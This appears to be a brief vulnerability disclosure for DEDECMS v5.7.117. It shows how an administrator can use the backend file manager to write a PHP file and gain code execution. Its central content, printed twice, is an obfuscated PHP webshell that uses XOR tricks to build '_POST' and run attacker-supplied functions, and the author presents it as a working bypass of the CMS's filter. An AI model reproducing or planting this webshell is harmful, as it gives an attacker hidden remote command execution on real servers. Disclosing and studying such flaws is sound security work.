The DEDECMS v5.7.117 version has a vulnerability that allows arbitrary code execution in the backend through the creation of new files.

After logging into the administrator account, visit the auxiliary plugin section in the module, click on the file manager and then click on "New File".

![image-20250318191534958](https://bu.dusays.com/2025/03/18/67d95984b45b8.png)

Then just write a random file name, write a one-liner Trojan, and then click save.

![image-20250318191829012](https://bu.dusays.com/2025/03/18/67d95980b3b3d.png)

Filtering was found

![image-20250318192013959](https://bu.dusays.com/2025/03/18/67d9597c94d2d.png)

After testing, you can use the following code to bypass it

```
<?php
@$_++; 
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
${$__}[!$_](${$__}[$_]); 
?>
```

**Vulnerability Validation:**

Create a new 1.php file and save it

```
<?php
@$_++; 
$__=("#"^"|").("."^"~").("/"^"`").("|"^"/").("{"^"/");
${$__}[!$_](${$__}[$_]); 
?>
```

![image-20250318192255932](https://bu.dusays.com/2025/03/18/67d9597494f70.png)

Then access the uploaded 1.php and find that the command was successfully executed

![image-20250318192324872](https://bu.dusays.com/2025/03/18/67d9596e7bbb8.png)

